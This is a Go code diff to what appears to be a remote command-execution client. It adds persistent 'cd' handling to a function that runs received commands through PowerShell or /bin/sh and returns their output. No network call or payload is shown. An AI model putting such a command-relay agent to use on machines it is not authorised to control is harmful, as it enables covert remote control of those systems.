@@ -5,6 +5,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"time"
@@ -42,18 +43,21 @@ func newClient(clientID string) *Client {
 // og from ki
 
 func execute(cmd string) string {
-	var c *exec.Cmd
+	trimmed := strings.TrimSpace(cmd)
 
-	// choose OS to run command on
+	// Intercept 'cd' so directory changes persist across commands.
+	if strings.EqualFold(trimmed, "cd") || strings.HasPrefix(strings.ToLower(trimmed), "cd ") {
+		return handleCd(trimmed)
+	}
+
+	var c *exec.Cmd
 	switch runtime.GOOS {
 	case "windows":
-		// using ps cus cmd lame
 		c = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd)
 	default:
 		c = exec.Command("/bin/sh", "-c", cmd)
 	}
 
-	// returns the output of the results
 	out, err := c.CombinedOutput()
 	result := strings.TrimSpace(string(out))
 
@@ -64,10 +68,45 @@ func execute(cmd string) string {
 		return fmt.Sprintf("[exit error: %s]", err)
 	}
 	if result == "" {
-		// commands like cd wont create output maybe besides on ps
 		return "[command produced no output]"
 	}
 	return result
+}
+
+// handleCd changes the process working directory so subsequent commands inherit it.
+// Child shells can't change the parent's cwd, so we do it here.
+func handleCd(cmd string) string {
+	target := strings.TrimSpace(cmd[2:]) // strip 'cd'
+	target = strings.Trim(target, `"'`)  // strip quotes
+
+	if target == "" {
+		cwd, err := os.Getwd()
+		if err != nil {
+			return fmt.Sprintf("[error getting cwd: %s]", err)
+		}
+		return cwd
+	}
+
+	if target == "~" || strings.HasPrefix(target, "~/") || strings.HasPrefix(target, `~\`) {
+		home, err := os.UserHomeDir()
+		if err == nil {
+			if target == "~" {
+				target = home
+			} else {
+				target = filepath.Join(home, target[2:])
+			}
+		}
+	}
+
+	if err := os.Chdir(target); err != nil {
+		return fmt.Sprintf("cd: %s", err)
+	}
+
+	newDir, err := os.Getwd()
+	if err != nil {
+		return target
+	}
+	return newDir
 }
 
 /*
